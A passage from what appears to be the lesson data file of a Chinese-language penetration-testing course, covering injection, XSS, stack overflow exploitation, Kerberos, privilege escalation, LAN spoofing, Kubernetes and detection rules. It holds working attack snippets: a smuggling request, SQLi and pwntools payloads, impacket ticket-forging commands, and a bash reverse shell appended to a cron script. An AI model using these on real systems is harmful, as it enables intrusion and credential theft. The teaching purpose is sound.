      {h:'2. 走私就诞生在「应当」二字上',p:'不同实现对这个「应当」的处理不一样：有的按 TE 解析、有的按 CL 解析、有的先看 CL、有的遇到畸形 chunk 就回退。当前端按 CL 认为 body 只有 6 字节，后端按 chunked 认为还有后续 chunk，剩下的字节就被后端当成「下一条请求的开头」——而这条请求恰好排在你后面那个用户的 TCP 连接里。'},
      {h:'3. 为什么它比普通注入更危险',p:'普通注入影响你自己的请求；走私污染的是连接池里的下一条请求，也就是说你可以影响别人的请求、甚至劫持管理员的会话。这也是为什么它长期是赏金榜上的高价值漏洞：影响面取决于前置代理的复用策略，而不是目标应用本身。'}
     ],
     code:{l:'http',t:'# CL.TE 最经典形态：前端信 CL，后端信 TE\nPOST / HTTP/1.1\nHost: target\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG\n# 前端读到 6 字节就转发完毕；后端把 "0\\n\\n" 当结束块，剩下的 "G" 留在缓冲区，与下一条请求拼接成 GPOST /\n\n# 验证思路（不要在非授权目标上试）：\n# 1. 先发一个「探测」请求，观察响应是否被延迟/异常\n# 2. 用时间差法：走私一个带慢响应的请求，看自己的正常请求是否被卡住\n# 3. 差分法：CL.TE / TE.CL / TE.TE 三种组合逐个试，只有一种会生效'},
     exp:'本地起两套解析器做对照实验：nginx 反代 + 后端 Node/Gunicorn，用 nc 手工发上面这段字节，在前后端各打一行日志，亲眼看「长度」在两个进程里算出的不同结果。这一步做完，payload 长什么样就不需要背了。',
     check:['能画出 CL 与 TE 两条解析路径的分叉点','能解释为什么 TE.CL 的利用通常更难但更可靠','能说出至少两种服务端缓解措施及其绕过可能'],
     read:['RFC 7230 §3.3.3（消息体长度）','PortSwigger: HTTP request smuggling（含各变体）']},
    {id:'t2',ic:'🗄',cat:'Web',lv:'D3',time:'40 分钟',
     title:'为什么这条注入能跑：从 SQL 执行计划看注入的成立条件',
     q:'注入能成立，本质是「数据」被引擎当成了「语法」。理解这一点，才知道什么时候注不进去。',
     body:[
      {h:'1. 解析顺序决定了注入点',p:'SQL 是编译执行的：词法分析 → 语法分析 → 生成执行计划 → 执行。参数化查询把用户输入绑定在「执行」阶段，所以无论输入什么，它永远只是值。字符串拼接则把输入送进了「语法分析」阶段，输入里的引号、注释符、分号会改变语法树结构。'},
      {h:'2. 为什么有的注入读不出数据',p:'能注不等于能读。union 需要列数与类型匹配；盲注需要能构造布尔差异或时间差异；堆叠查询需要驱动支持多语句（PDO 默认不支持，mysqli 的 multi_query 支持）。同一个注入点在三种条件下表现完全不同——这就是为什么 writeup 里的 payload 换到你的目标上会失败。'},
      {h:'3. 二阶注入与 ORM 的假安全',p:'很多系统对入口做了转义，但把「转义后的字符串」存进库，之后又从库里取出拼进第二条 SQL——转义在这一层失效，这叫二阶注入。ORM 也不是万能：whereRaw、order by 拼接、动态表名这些地方绕过了参数绑定，是 ORM 项目里最常见的真实漏洞位置。'}
     ],
     code:{l:'sql',t:'-- 能跑的前提：注入进入语法分析阶段\nSELECT id, name FROM users WHERE name = \'$input\';\n-- input = \' UNION SELECT 1,version()-- -\nSELECT id, name FROM users WHERE name = \'\' UNION SELECT 1,version()-- -\';\n\n-- 参数化后，同样的输入只是一段字符串，语法树不变\nSELECT id, name FROM users WHERE name = ?;   -- 参数: "\' UNION SELECT 1,version()-- -"\n\n-- 审计时重点看这些「绕开绑定」的写法：\n-- order by ${col} / whereRaw("id = " + id) / 表名、列名拼接 / LIMIT 拼接'},
     exp:'自己写 30 行 PHP 或 Node 代码，做两个接口：一个拼接、一个参数化。用同一串 payload 打两个接口，打印最终执行的 SQL 语句。再做一次「转义后入库、取出拼接」的二阶实验，观察转义为什么失效。',
     check:['能说出 union 注入的三个前提（列数、类型、回显位）','能区分「能注」与「能读」的差别','能在代码里指出哪些写法绕过了参数绑定'],
     read:['OWASP: SQL Injection Prevention Cheat Sheet','《SQL 注入攻击与防御》第 2 版']},
    {id:'t3',ic:'🌐',cat:'Web',lv:'D3',time:'40 分钟',
     title:'XSS 不是「弹个框」：浏览器渲染管线与同源模型的边界',
     q:'XSS 的本质是「你的字符串被某个解析上下文当成了代码」。上下文不同，逃逸方式完全不同。',
     body:[
      {h:'1. 五个解析上下文，五套逃逸规则',p:'同一个变量可能落在 HTML 文本、HTML 属性、URL、JS 字符串、CSS 里。落在 HTML 文本里要闭合标签；落在属性里要闭合引号；落在 <script> 里要闭合字符串或提前结束脚本；落在 href 里可以用 javascript: 伪协议。这就是为什么「统一转义 &<>"」并不够——HTML 实体在 <script> 内部不生效。'},
      {h:'2. DOM XSS 绕过了服务端',p:'innerHTML、document.write、eval、setTimeout(字符串)、jQuery 的 $() 都可能把字符串当 HTML/代码执行。这类漏洞服务端完全看不到 payload，WAF 也拦不住，因为 payload 从不经过网络请求——它来自 location.hash 或 localStorage。检测 DOM XSS 必须读 JS 源码里的「source → sink」数据流。'},
      {h:'3. 同源模型才是它危险的真正原因',p:'同源策略允许同源页面互相读取 DOM、共享 cookie。XSS 让你在「目标源」里执行代码，于是你能读它的 localStorage、发它的 API 请求（带 cookie）、改它的页面骗管理员操作。所以 XSS 的价值不是弹窗，而是「以受害者身份在目标源内为所欲为」，包括绕过 CSRF token。'}
     ],
     code:{l:'html',t:'<!-- 同一个变量，四种上下文 -->\n<div>${name}</div>                       <!-- HTML 文本：闭合标签 -->\n<input value="${name}">                 <!-- 属性：闭合引号 -->\n<a href="${url}">x</a>                  <!-- URL：javascript: / data: -->\n<script>var n = "${name}";<\/script>     <!-- JS 字符串：闭合引号或 <\/script> -->\n\n<!-- DOM 侧的危险 sink -->\nel.innerHTML = location.hash.slice(1);   // 直接执行\n$(".box").html(decodeURIComponent(h));  // jQuery 同样危险\n\n<!-- 正确做法：按上下文编码 + CSP 兜底 -->\n<!-- Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-xxx\' -->'},
     exp:'在一个静态页面上做四组实验：把同一个字符串分别塞进上面四个位置，观察哪些需要闭合、哪些需要实体、哪些直接被拦。然后加上 CSP，再试一次，体会「编码修复注入、CSP 缩小影响面」的分工。',
     check:['能针对四种上下文写出对应的编码方式','能指出三个 DOM XSS 的典型 source 与 sink','能解释 CSP 为什么不能替代输出编码'],
     read:['OWASP XSS Prevention Cheat Sheet','HTML Living Standard: 解析算法概述']},
    {id:'t4',ic:'🧱',cat:'Pwn',lv:'D4',time:'60 分钟',
     title:'栈帧、调用约定与返回地址：从 C 源码到 ROP 的完整链路',
     q:'缓冲区溢出能劫持执行流，靠的不是「覆盖」，而是「函数返回时从栈上取走了你写的东西」。',
     body:[
      {h:'1. 一次函数调用在内存里发生了什么',p:'call 指令把返回地址压栈并跳到函数入口；函数序言 push rbp; mov rbp,rsp; sub rsp,N 建立栈帧；局部数组就住在 rbp-N 的位置。当输入长度超过数组容量，就会顺着低地址向高地址覆盖：先是局部变量、保存的 rbp，然后是返回地址。函数执行 ret 时，CPU 从栈顶弹出这个值装进 rip——执行流就归你了。'},
      {h:'2. 为什么现代系统不那么好打了',p:'NX 让栈不可执行，于是要 ROP（复用已有代码片段）；ASLR 让地址随机，于是要先泄漏一个地址；Canary 在返回地址前放一个随机值并在返回前校验，于是要先泄漏 canary；PIE 让代码段也随机。这四道防线决定了你的利用链顺序：先泄漏、再算基址、再拼 rop chain。'},
      {h:'3. 偏移量不是猜出来的',p:'找偏移的标准做法：pattern_create 生成循环特征串，崩溃时看 rip 的值，用 pattern_offset 反查。或者在 gdb 里看 rbp 与缓冲区首地址的距离。偏移错了，整个利用链就只是「换个方式崩溃」——这是新手最常见的失败原因，占失败案例的大半。'}
     ],
     code:{l:'c',t:'// 有漏洞的最小样本\nvoid vuln(void){\n    char buf[64];\n    gets(buf);      // 无边界检查，向低地址的 buf 写入任意长度\n}\n// 编译：gcc -fno-stack-protector -no-pie -z execstack vuln.c -o vuln\n\n# 找偏移\npython3 -c "from pwn import *; print(cyclic(200))" | ./vuln\ngdb ./vuln -ex "run < <(python3 -c \'from pwn import *;print(cyclic(200)))\')" -ex "info registers rip"\npython3 -c "from pwn import *; print(cyclic_find(0x6161616c))"\n\n# 最小利用骨架（pwntools）\nfrom pwn import *\np = process(\'./vuln\')\npayload = b\'A\'*72 + p64(0x4011a9)   # 偏移 72 覆盖到返回地址\np.sendline(payload); p.interactive()'},
     exp:'把上面 20 行代码编译四次：默认、-fno-stack-protector、-no-pie、无 NX。每次都用同样的 payload 打一遍，记录哪一次成功、哪一次只崩溃、哪一次报 stack smashing detected。这四次对照会让你彻底记住每道防线拦的是什么。',
     check:['能画出栈帧布局并标出缓冲区、canary、rbp、ret 的位置','能用 pattern 手工算出偏移而不是靠猜','能解释 ret2libc 与 ret2syscall 的适用差异'],
     read:['《深入理解计算机系统》第 3 章','ROP Emporium 前 3 关（含官方解法对照）']},
    {id:'t5',ic:'🔐',cat:'密码学',lv:'D3',time:'45 分钟',
     title:'密钥派生、填充与 AEAD：真实系统里的密码学是怎么被用坏的',
     q:'90% 的密码学漏洞不是算法被攻破，而是「用错了模式」或「比较用了 !=」。',
     body:[
      {h:'1. 哈希、HMAC、KDF 是三种不同的东西',p:'哈希（SHA-256）用于完整性，不抗暴力；HMAC 用密钥把哈希变成消息认证码，能防篡改；KDF（PBKDF2/bcrypt/scrypt/Argon2）故意慢，用于从口令派生密钥。把 SHA-256 当口令存储，等于给 GPU 送礼物——现代显卡每秒能算几十亿次，而 bcrypt 成本因子 12 每秒只有几千次。'},
      {h:'2. 模式选错，加密等于没加密',p:'ECB 相同明文块产生相同密文块，能看出图片轮廓，也能做块重排攻击；CBC 需要随机 IV 且必须校验 MAC，否则可做填充预言（padding oracle）；CTR/GCM 的 nonce 绝不能复用，复用一次就能恢复明文异或关系。工程上的正确姿势是直接用 AEAD（AES-GCM / ChaCha20-Poly1305），不要自己拼「加密再哈希」。'},
      {h:'3. 侧信道与比较逻辑',p:'用 == 比较 HMAC 会在第一个不同字节处提前返回，逐字节爆破即可伪造签名——正确做法是常量时间比较（hmac.compare_digest / crypto.timingSafeEqual）。同理，登录接口「用户不存在」和「密码错误」返回不同文案，就是用户名枚举；重置令牌用可预测的时间戳或自增 ID，就是账号接管的入口。'}
     ],
     code:{l:'python',t:'# 口令存储：错误 vs 正确\nimport hashlib, bcrypt\nbad  = hashlib.sha256(pw.encode()).hexdigest()          # 可被 GPU 高速爆破\nok   = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(12))   # 慢 + 自带盐\n\n# 验证签名：错误 vs 正确\nif sig == expected:                 # 提前返回，存在时间侧信道\nif hmac.compare_digest(sig, expected):   # 常量时间\n\n# AES-GCM 正确用法（nonce 每次必须唯一）\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nnonce = os.urandom(12); ct = AESGCM(key).encrypt(nonce, data, aad)   # 密文自带完整性\n\n# 填充预言的最小判定：只改最后一个字节，看错误类型是否不同\n# 只要「填充错误」与「解密失败」能被区分，就能逐字节解出明文'},
     exp:'写两段脚本：第一段用 SHA-256 存 10 万个常见口令，测每秒尝试次数；第二段用 bcrypt cost=12 做同样的事。算出「一个 8 位口令在两种方案下被爆破的时间差」，这个数量级差就是为什么必须用 KDF。',
     check:['能说清哈希、HMAC、KDF 各自解决什么问题','能解释 GCM nonce 复用为什么致命','能写出常量时间比较的必要性'],
     read:['OWASP Password Storage Cheat Sheet','《Real-World Cryptography》第 4、6 章']},
    {id:'t6',ic:'🎫',cat:'身份',lv:'D4',time:'50 分钟',
     title:'信任是怎么传递的：NTLM、Kerberos、OAuth 与 SAML 的共同逻辑',
     q:'所有身份攻击都在问同一个问题：谁签的票？票能被谁验证？验证时真的校验了所有字段吗？',
     body:[
      {h:'1. NTLM：挑战应答与它的历史包袱',p:'NTLM 是挑战-应答：服务端发 8 字节挑战，客户端用口令哈希加密挑战返回。问题在于这个哈希等价于口令（pass-the-hash），且协议不绑定目标服务（可中继到别的机器）。Net-NTLMv2 捕获后可以离线爆破，所以 Responder  poisoning 才有价值：先骗出认证，再爆破或中继。'},
      {h:'2. Kerberos：票据体系与它的两类滥用',p:'Kerberos 用 KDC 签发 TGT（证明你是谁）和 TGS（证明你能访问某服务）。服务账号的密钥由口令派生，所以任何用户都能请求任意服务的 TGS 并离线爆破——这就是 Kerberoasting。反过来，如果拿到 KRBTGT 的哈希，就能伪造任意用户任意权限的 TGT（黄金票据），有效期可长达 10 年，且默认日志里看不出异常。'},
      {h:'3. OAuth/SAML：把信任外包出去的代价',p:'OAuth 的授权码流程里，redirect_uri 校验不严就能把 code 送到攻击者域名；SAML 靠 XML 签名，若解析器允许签名包裹（XSW）或接受未签名断言，就能伪造任意身份。共同点是：协议本身没问题，实现方少校验了一个字段。审计这类系统的核心动作就是「把每个断言字段逐个删掉/改掉，看它是否还认」。'}
     ],
     code:{l:'bash',t:'# Kerberoasting：任何域用户都能请求服务票据并离线爆破\nimpacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.10 -request\nhashcat -m 13100 spn.txt rockyou.txt\n\n# AS-REP Roasting：不需要预认证的账号可直接拿到可爆破的密文\nimpacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -no-pass -usersfile users.txt\nhashcat -m 18200 asrep.txt rockyou.txt\n\n# 黄金票据：拿到 krbtgt 哈希后可伪造任意 TGT\nimpacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local admin\n\n# 防御视角：这些攻击的日志特征分别是什么？\n# 4769（请求服务票据，加密类型 RC4 且量大）/ 4768 / 4624 类型 3 的异常来源'},
     exp:'在 GOAD 或自建域里做一次完整闭环：先用 Responder 抓一个 Net-NTLMv2 并爆破，再用域内普通账号做 Kerberoasting，最后用 BloodHound 找一条到 Domain Admin 的最短路径。每步都记下「日志里长什么样」，这份对照表就是蓝队最想要的东西。',
     check:['能画出 TGT / TGS 的签发与验证流程','能解释 pass-the-hash 与 pass-the-ticket 的区别','能说出 OAuth redirect_uri 校验的三种常见缺陷'],
     read:['MITRE ATT&CK: Steal or Forge Kerberos Tickets','PortSwigger: OAuth 2.0 authentication vulnerabilities']},
    {id:'t7',ic:'🐧',cat:'提权',lv:'D4',time:'45 分钟',
     title:'Linux 权限的真实边界：uid、capabilities、namespace 与 seccomp',
     q:'root 不是一个布尔值，而是一组能力的集合。理解这一点，才能理解容器逃逸。',
     body:[
      {h:'1. 从 uid 到 capabilities',p:'传统模型里 uid=0 就是神。但内核早已把 root 的权限拆成 40 多个 capability：CAP_NET_RAW 能抓包、CAP_SYS_ADMIN 几乎等于 root、CAP_DAC_READ_SEARCH 能绕过文件读权限。所以 SUID 提权之外，更隐蔽的是「某个二进制带了危险 capability」——getcap -r / 2>/dev/null 一跑，常能看到 python3 cap_setuid+ep 这种直接给 root 的配置。'},
      {h:'2. 内核视角的隔离：namespace + cgroup + seccomp',p:'容器不是虚拟机，它只是被 namespace 遮住视图、被 cgroup 限住资源、被 seccomp 过滤系统调用的普通进程。所以逃逸的本质是「找到一个能越过 namespace 边界的接口」：挂载宿主目录、访问 docker.sock、利用需要 CAP_SYS_ADMIN 的挂载点、或直接打内核漏洞。'},
      {h:'3. 提权排查的可复用清单',p:'固定顺序过一遍：sudo -l（含 NOPASSWD 与可写脚本）→ SUID/SGID → capabilities → cron 与 systemd timer → 可写的 PATH 目录 → 服务配置文件权限 → 内核版本与已知 CVE → 家目录里的凭据与历史命令。这个顺序不是背的，它对应「哪些机制能让普通用户以更高身份执行代码」。'}
     ],
     code:{l:'bash',t:'# 一条命令过一遍常见提权面\necho "== sudo =="; sudo -l 2>/dev/null\necho "== suid =="; find / -perm -4000 -type f 2>/dev/null\necho "== caps =="; getcap -r / 2>/dev/null\necho "== cron =="; ls -la /etc/cron* /var/spool/cron 2>/dev/null\necho "== writable =="; find / -writable -type d 2>/dev/null | grep -v proc\n\n# 容器内快速判断「我是不是容器、逃逸面在哪」\nls -la /.dockerenv; cat /proc/1/cgroup | head -3; capsh --print | head -5\nmount | grep -E "docker|overlay|proc"\n\n# 典型配置类提权：可写脚本被 root 的 cron 调用\necho "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/backup.sh'},
     exp:'用 Docker 起一个普通容器，分别做三次实验：挂载 docker.sock、--privileged、挂载宿主 /etc。每次都在容器里尝试读取宿主文件或起一个新容器。做完你会对「容器隔离等级」有肌肉记忆，也会明白为什么 K8s 里 privileged 是红线。',
     check:['能用 getcap 找到危险 capability 并说明利用方式','能解释容器逃逸的三类入口','能默写提权排查顺序并说明每一步对应哪个机制'],
     read:['GTFOBins（每个二进制的滥用方式）','Linux capabilities 手册页 capabilities(7)']},
    {id:'t8',ic:'🪟',cat:'提权',lv:'D4',time:'40 分钟',
     title:'Windows 令牌与内核对象：为什么「以管理员运行」不等于 SYSTEM',
     q:'Windows 的权限不是身份，而是令牌里的组、特权与完整性级别。',
     body:[
      {h:'1. 访问令牌里装了什么',p:'每个进程有一个主令牌：用户 SID、所属组、特权列表（SeDebugPrivilege 等）、完整性级别（Low/Medium/High/System）。UAC 的「管理员批准模式」让管理员平时跑在 Medium 完整性、权限被过滤的令牌里——这就是为什么你是管理员却读不了某些进程内存。'},
      {h:'2. 从管理员到 SYSTEM 的经典路径',p:'只要拿到 SeDebugPrivilege，就能打开 SYSTEM 进程并窃取它的令牌（token impersonation）；只要某个以 SYSTEM 运行的服务其可执行文件路径未加引号（unquoted service path），就能在路径空隙里放一个同名程序；只要服务对普通用户有 SERVICE_CHANGE_CONFIG 权限，就能改它的 binPath。这三条覆盖了绝大多数 Windows 本地提权。'},
      {h:'3. 为什么「打了补丁」还会被打',p:'提权漏洞分两类：一类是内核/组件漏洞（需补丁），一类是配置错误（补丁永远修不掉）。PowerUp / WinPEAS 输出的绝大多数条目属于第二类：服务权限、注册表可写、AlwaysInstallElevated、计划任务。所以真实项目里，配置审计的产出往往比漏洞利用更稳定。'}
     ],
     code:{l:'powershell',t:'# 当前令牌与特权\nwhoami /priv\nwhoami /groups | findstr "Mandatory Label"\n\n# 服务配置类提权检查（PowerUp）\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# 未加引号的服务路径\nwmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\\\Windows"\n\n# 令牌窃取（需 SeDebugPrivilege，在授权环境使用）\n# 思路：找到以 SYSTEM 运行的进程 -> OpenProcess -> OpenProcessToken -> DuplicateToken -> CreateProcessAsUser\n\n# 计划任务与 AlwaysInstallElevated\nschtasks /query /fo LIST /v | findstr /i "TaskName Run As User"\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'},
     exp:'在一台自建 Windows 10 虚拟机里，把自己降成一个普通域用户，用 WinPEAS 跑一遍，把输出按「配置类 / 补丁类」分类。然后手工复现其中一条配置类提权（例如可写服务目录），并写清「如果我是管理员，该怎么改配置才能堵住」。',
     check:['能解释 UAC 过滤令牌与完整性的关系','能说出三条本地提权路径的触发条件','能把 WinPEAS 输出分成配置类与漏洞类'],
     read:['Windows Internals 第 7 版 第 7 章（安全性）','PayloadsAllTheThings: Windows Privilege Escalation']},
    {id:'t9',ic:'📡',cat:'内网',lv:'D3',time:'35 分钟',
     title:'局域网的信任假设：ARP、DNS、LLMNR 与 IPv6 为什么都能被冒充',
     q:'内网协议在设计时假设「同网段的人都是可信的」。这个假设一旦不成立，几乎每个协议都能被冒充。',
     body:[
      {h:'1. 无认证的解析协议',p:'ARP 没有认证，谁回答得快谁赢，于是可以声称「网关的 IP 在我这个 MAC 上」，流量就改道了。DNS 默认无签名，LLMNR/NBNS 是「谁先回答谁算」的广播查询——这就是 Responder 的工作原理：不是攻破什么，只是抢答。'},
      {h:'2. IPv6 的默认开启是另一个入口',p:'很多内网只防了 IPv4，但 Windows 默认开启 IPv6 且优先。攻击者发 Router Advertisement 就能成为网段的 IPv6 路由器，进而下发 DNS，把流量引到自己这里。mitm6 就是干这个的，配合 WPAD 或 NTLM 中继效果极好。'},
      {h:'3. 中继比爆破更划算',p:'抓到 Net-NTLMv2 只能离线爆破（口令复杂就废了），但 NTLM 中继是「实时把认证转发给另一台机器」，不需要知道口令。能否中继取决于目标是否开启了 SMB 签名、是否强制 LDAP 签名。所以内网评估的核心问题往往不是「怎么抓哈希」，而是「哪台机器没开签名」。'}
     ],
     code:{l:'bash',t:'# 被动监听（只读，先看清网段里有什么）\nresponder -I eth0 -A\n\n# 主动投毒（授权环境）\nresponder -I eth0 -wd\n\n# IPv6 接管，配合中继\nmitm6 -d corp.local\nimpacket-ntlmrelayx -6 -tf targets.txt -smb2support\n\n# 判断能不能中继：签名开关\nnmap -p445 --script smb2-security-mode 10.0.0.0/24\nrpcclient -U "" 10.0.0.10 -c "getdompwinfo"   # 看 LDAP 签名要求'},
     exp:'用两台虚拟机做一个最小实验：A 开 Responder，B 尝试访问一个不存在的共享名。观察 B 自动发 LLMNR 查询、A 抢答、B 送出 Net-NTLMv2 的全过程，用 Wireshark 抓包对照。然后关掉 LLMNR 再试，确认攻击失效。',
     check:['能解释 ARP 欺骗与 LLMNR 抢答的共同弱点','能说出 NTLM 中继成立的两个前提','能给出三条内网加固措施并说明拦的是哪类攻击'],
     read:['MITRE ATT&CK: Adversary-in-the-Middle','《内网安全攻防》第 2、4 章']},
    {id:'t10',ic:'☸️',cat:'云原生',lv:'D4',time:'45 分钟',
     title:'Kubernetes 的信任边界：ServiceAccount、RBAC 与准入控制',
     q:'K8s 里没有「root」，只有「这个 token 能调哪些 API」。逃逸的本质是拿到更强的 token 或落到更强的节点。',
     body:[
      {h:'1. Pod 里的 token 就是身份',p:'每个 Pod 自动挂载 ServiceAccount token（/var/run/secrets/kubernetes.io/serviceaccount/token），用它调 API Server。如果这个 SA 绑了 list secrets 或 create pods 权限，攻击者就能读全部 Secret 或在集群里起新 Pod——很多「K8s 沦陷」其实就是一次过度授权。'},
      {h:'2. 从 Pod 到节点的三条路',p:'hostPath 挂载宿主目录（直接读写宿主文件系统）、privileged 容器（能挂载设备、改内核参数）、hostNetwork + hostPID（能看宿主进程、抓宿主流量）。这三条都属于「配置即漏洞」，准入控制（PSP 的后继者 Pod Security Standards / OPA Gatekeeper）才是真正的护栏。'},
      {h:'3. 供应链与镜像',p:'镜像里的基础层、CI 的构建凭据、Helm chart 的 values、以及 admission webhook 本身，都是攻击面。真实案例里「在 CI 里投毒镜像，等集群拉取」比「现场打 Pod」更常见。审计时看：镜像是否固定 digest、是否以 root 运行、是否有 latest 标签。'}
     ],
     code:{l:'bash',t:'# 拿到 Pod 后第一步：我能调什么？\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN auth can-i --list\n\n# 常见的高危权限\n#   list/get secrets        -> 读全部凭据\n#   create pods             -> 起特权 Pod 挂宿主\n#   create clusterrolebinding -> 直接给自己提权\n\n# 判断是否 privileged / 挂了宿主目录\ncat /proc/1/status | grep CapEff\nmount | grep -E "host|/var/lib/kubelet"\n\n# 用 RBAC 做最小权限：只给需要的 verb 和 resource\nkubectl create role pod-reader --verb=get,list --resource=pods\n\n# 准入控制：禁止特权与 hostPath（Pod Security Standards）\nkubectl label ns prod pod-security.kubernetes.io/enforce=restricted'},
     exp:'用 kind 或 k3d 起一个本地集群，故意建一个绑了 cluster-admin 的 ServiceAccount 给一个 Pod，然后在 Pod 里读 Secret、起特权 Pod 挂宿主根目录。做完再把这个 SA 改成只读 pods，重试一次，确认攻击链断在哪一步。',
     check:['能说出 Pod 内 token 的位置与用途','能列出三条 Pod → Node 的逃逸路径','能用 RBAC 写出一条最小权限规则'],
     read:['Kubernetes 官方文档：RBAC 与 Pod Security Standards','MITRE ATT&CK for Containers']},
    {id:'t11',ic:'🔬',cat:'研究',lv:'D5',time:'60 分钟',
     title:'漏洞挖掘方法论：攻击面枚举、差分测试与代码审计模式',
     q:'挖不到漏洞通常不是技术不够，而是没有系统地列出「哪些输入会进入哪些危险函数」。',
     body:[
      {h:'1. 先建攻击面清单，再动手',p:'把目标拆成四类入口：HTTP 参数/头/Cookie、文件与上传、协议与端口、第三方集成（webhook、OAuth 回调、SAML）。对每个入口记录三件事：谁解析它、解析后流向哪、有没有鉴权。这份表比任何工具输出都重要，因为它决定你去哪里花时间。'},
      {h:'2. 代码审计靠「模式」而不是通读',p:'高效审计是搜索危险 sink 再反查数据流：Java 找 Runtime.exec / 反序列化 readObject / SpEL；PHP 找 include、unserialize、assert、preg_replace /e；Node 找 child_process、eval、模板拼接；Python 找 pickle、yaml.load、subprocess(shell=True)。找到 sink 后问：这个参数能被外部控制吗？中间有没有过滤？过滤是否可绕？'},
      {h:'3. 差分测试与模糊测试的位置',p:'差分测试适合「同一输入在不同实现下表现不同」的场景（解析器、序列化、鉴权中间件），也是请求走私、参数污染类漏洞的发现方式。Fuzz 适合二进制与协议解析，关键在种子质量与覆盖率反馈（AFL++、libFuzzer）。而逻辑漏洞只能靠人：把业务流程画成状态机，找「能跳过某个状态」的路径。'}
     ],
     code:{l:'bash',t:'# 审计第一步：把危险函数捞出来（Java 示例）\nrg -n "Runtime\\.getRuntime|ProcessBuilder|readObject|SpelExpressionParser|ScriptEngine" --type java\n\n# PHP 高危 sink\nrg -n "unserialize\\(|include\\s*\\(|assert\\(|preg_replace\\(.*/e|system\\(|shell_exec\\(" --type php\n\n# Fuzz 最小闭环（AFL++）\nafl-clang-fast target.c -o target\nafl-fuzz -i seeds/ -o out/ -- ./target @@\n\n# 覆盖率看什么\nafl-whatsup out/    # 看 paths 增长速度：不涨说明种子或字典该换了\n\n# 逻辑漏洞：把流程写成状态机再找跳转\n# 下单 -> 支付 -> 发货   能否直接跳到「发货」？能否把已支付订单改回未支付？'},
     exp:'选一个你熟悉的中小型开源项目（PHP 或 Java），先用 rg 列出所有危险 sink，挑 5 个追数据流，写出「可控/不可控」的判断依据。目标不是挖到 CVE，而是练出「3 分钟内判断这个 sink 值不值得深挖」的直觉。',
     check:['能为一个目标列出完整攻击面清单','能背出四类语言的高危 sink 清单','能解释差分测试最适合发现哪类漏洞'],
     read:['《代码审计：企业级 Web 代码安全架构》','AFL++ 官方文档：fuzzing 101']},
    {id:'t12',ic:'🛡',cat:'蓝队',lv:'D4',time:'45 分钟',
     title:'检测工程：把一次攻击翻译成可复用的检测规则',
     q:'红队证明「能进来」，蓝队要证明「进来会被看见」。看见的前提是把行为映射到数据源。',
     body:[
      {h:'1. 先问「这个动作会留下什么」',p:'任何攻击动作都会触碰某个系统调用或API：进程创建（Sysmon 1 / 4688）、网络连接（Sysmon 3）、文件写入（11）、注册表修改（13）、服务安装（7045）、票据请求（4769）。找不到数据源的动作，等于不可检测——这时要做的是补日志，而不是写规则。'},
      {h:'2. 从行为到规则：Sigma 的写法',p:'Sigma 是厂商无关的检测描述语言，能编译成 Splunk/Elastic/Sentinel 查询。一条好规则要有：明确的 logsource、少量高区分度字段、以及「为什么这样写」的注释。切忌只写 CommandLine contains "mimikatz"——改个名字就绕过了；应该写行为组合，例如「非浏览器进程访问 lsass 句柄」。'},
      {h:'3. 用 ATT&CK 做覆盖度地图',p:'把规则映射到 ATT&CK 技术编号，就能看出覆盖盲区：执行和持久化规则很多，凭据访问和横向移动往往空白。评估检测能力不要数规则条数，而要数「能覆盖多少个技术、每个技术是否有至少一条高置信规则」。最后一定要做验证：用 Atomic Red Team 跑一遍，看规则是否真的触发。'}
     ],
     code:{l:'yaml',t:'# Sigma 规则骨架：LSASS 访问（凭据访问 T1003.001）\ntitle: Suspicious LSASS Access by Non-System Process\nid: 3f2a-...\nstatus: experimental\nlogsource:\n  product: windows\n  category: process_access\ndetection:\n  selection:\n    TargetImage|endswith: \'\\\\lsass.exe\'\n    GrantedAccess|contains:\n      - \'0x1010\'\n      - \'0x1410\'\n  filter_main:\n    SourceImage|startswith:\n      - \'C:\\\\Windows\\\\System32\\\\\'\n      - \'C:\\\\Program Files\\\\Windows Defender\\\\\'\n  condition: selection and not filter_main\nlevel: high\n\n# 验证：先跑原子测试，再确认规则触发\n# atomic-operator run -a T1003.001'},
     exp:'选一个你上一节做过的攻击动作（例如 Kerberoasting），写出它的完整数据源清单与一条 Sigma 规则，然后用 Atomic Red Team 或手工复现触发它。如果规则没响，先怀疑数据源没开，再怀疑字段写错——这个排查过程就是检测工程师的日常。',
     check:['能把一个 ATT&CK 技术映射到具体日志字段','能写出带过滤条件、误报可控的 Sigma 规则','能说明为什么「关键字匹配」是坏规则'],
     read:['Sigma 官方规范','MITRE ATT&CK 与 Atomic Red Team']},
    /*__MS_A__*/
  ],
  projects:[
    {id:'p1',ic:'🏗',lv:'D3',time:'2 周',title:'自建一条内网攻击链（外网 → 域控）',
     why:'把所有零散技能压进一个项目，是唯一能把「会」变成「熟」的方式。',
     steps:['用 VMware/VirtualBox 搭 4 台机：Kali 攻击机、一台对外 Web（Linux）、一台内网 Windows、一台 DC（可用 GOAD 精简版）','在 Web 上故意留一个入口（上传或注入），自己写这 20 行有漏洞的代码','从外网打点 → 拿 shell → 提权 → 抓凭据 → 横向 → 拿域管，每一步都截图并记下命令','全程用 Wireshark 抓包，标注哪一步流量最可疑','最后写一份 15 页报告：攻击路径图、时间线、每个漏洞的根因、修复建议'],
     del:'攻击链图 + 命令时间线 + 15 页报告 + 一段 10 分钟讲解录音（讲给不懂安全的人听）'},

/* ============ state ============ */
const STORE = 'kali-academy-v1';
let state = loadState();
function loadState(){
  try{
    const s = JSON.parse(localStorage.getItem(STORE));
    if(s && typeof s === 'object') return {steps:s.steps||{}, quiz:s.quiz||{}, tasks:s.tasks||{}, last:s.last||null};
  }catch(e){}
  return {steps:{}, quiz:{}, tasks:{}, last:null};
}
function saveState(){ try{ localStorage.setItem(STORE, JSON.stringify(state)); }catch(e){} }

const $ = s => document.querySelector(s);
